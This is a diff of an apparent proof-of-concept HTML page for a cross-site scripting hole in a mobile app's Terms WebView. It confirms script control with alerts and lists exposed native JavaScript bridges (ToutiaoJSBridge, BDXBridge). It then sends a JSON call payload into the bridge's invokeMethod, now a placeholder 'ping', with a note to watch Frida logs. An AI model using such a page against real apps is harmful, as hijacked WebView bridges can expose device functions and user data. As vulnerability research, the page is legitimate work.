@@ -3,49 +3,71 @@
   <head>
     <meta charset="utf-8">
     <title>GAUTH XSS POC</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        background: #f5f5f5;
+        margin: 0;
+        padding: 16px;
+      }
+      h1 {
+        font-size: 20px;
+        margin-bottom: 8px;
+      }
+      button {
+        padding: 10px 16px;
+        margin-top: 16px;
+        font-size: 16px;
+      }
+      small {
+        display: block;
+        margin-top: 8px;
+        color: #555;
+      }
+    </style>
   </head>
   <body>
     <h1>GAUTH XSS POC</h1>
-    <p>If you see this inside the app, this page hijacked the Terms WebView.</p>
+    <p>If you see this inside the app, JS is running in the Terms WebView.</p>
 
-    <button onclick="doBridge()">Test native bridge</button>
+    <button onclick="testBridge()">Test native bridge</button>
+    <small>After pressing, check Frida logs for JSB2Impl.invokeMethod() JSON.</small>
 
     <script>
+      // Confirm control of the WebView
       alert("WebView controlled");
 
-      function listBridges() {
+      // Show which bridges are exposed
+      setTimeout(function () {
         var msg = [];
         if (window.BDXBridge) msg.push("BDXBridge");
         if (window.ToutiaoJSBridge) msg.push("ToutiaoJSBridge");
         alert("Available bridges: " + (msg.join(", ") || "none"));
-      }
+      }, 1000);
 
-      function doBridge() {
+      // Send a test payload into the native bridge
+      function testBridge() {
         try {
-          // Typical ToutiaoJSBridge payload structure seen in the wild
           var payload = {
-            "__callback_id": "0",
+            "__callback_id": "1",
             "__msg_type": "call",
-            "func": "device_getInfo",   // example native func name
-            "params": {}
+            "func": "ping",          // will change once real func name is known
+            "params": { from: "gauth-xss-poc" }
           };
 
           if (window.ToutiaoJSBridge && ToutiaoJSBridge.invokeMethod) {
             ToutiaoJSBridge.invokeMethod(JSON.stringify(payload));
-            alert("Sent invokeMethod(device_getInfo)");
+            alert("Sent ToutiaoJSBridge.invokeMethod()");
           } else if (window.BDXBridge && BDXBridge._invokeMethod) {
             BDXBridge._invokeMethod(JSON.stringify(payload));
-            alert("Sent _invokeMethod(device_getInfo)");
+            alert("Sent BDXBridge._invokeMethod()");
           } else {
-            alert("No bridge methods found");
+            alert("No bridge method available");
           }
         } catch (e) {
-          alert("Bridge call error: " + e);
+          alert("Bridge error: " + e);
         }
       }
-
-      // Run on load
-      setTimeout(listBridges, 1500);
     </script>
   </body>
 </html>
